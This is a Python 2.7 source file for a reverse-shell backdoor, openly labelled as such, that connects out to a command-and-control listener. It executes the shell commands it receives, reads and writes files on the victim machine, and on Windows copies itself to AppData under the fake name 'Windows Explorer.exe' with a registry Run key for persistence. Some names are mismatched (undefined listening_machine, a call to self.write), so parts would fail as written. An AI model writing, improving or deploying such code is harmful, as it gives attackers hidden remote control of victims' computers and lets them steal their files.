#!/usr/bin/env python
# written for python 2.7

import socket
import subprocess
import json
import os
import base64
import sys
import shutil
import platform

# backdoor class
class Backdoor:
    
    # initialixe with ip and port to connect to
    def __init__(self, ip, port):
        # persistence is for windows only need to come up with other system persistence methods in the future
        if platform.system() == "Windows":
            self.become_persistent_win()
        # make the connection to the socket
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((listening_machine, listening_port))
    
    # windows only function to become persistent
    def become_persistent_win(self):
        file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable,file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + file_location + '"', shell=True)
    
    # send and receive data using json wrapping
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    
    # execute a system command and gracefully handle errors
    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, "wb")
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
    
    # change the working directory by using os.chdir
    def change_working_directory(self, path):
        os.chdir(path)
        return "[+] Changing working directory to: " + path

    # read a local file to send back to command and control
    def read_file(self, path):
        with open(path, "rb") as remote_file:
            return base64.b64encode(remote_file.read())

    # write a local file sent by command and control
    def write_file(self, path, content):
        with open(path, "wb") as remote_file:
            remote_file.write(base64.b64decode(content))
            return "[+] Upload successful!"

    # main program loop receive commands and process according to the above methods
    def run(self):
        while True:

            try:
                command = self.reliable_receive()
                # exit command
                if command[0] == "3x17":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write(command[1],command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution"

            self.reliable_send(command_result)

# main program
try:
    # must set the arguments to the backdoor constructor to connect to the command and control listener
    my_backdoor = Backdoor("listenerIpAddress", listenerPortNumber)
    my_backdoor.run()
except Exception:
    sys.exit()

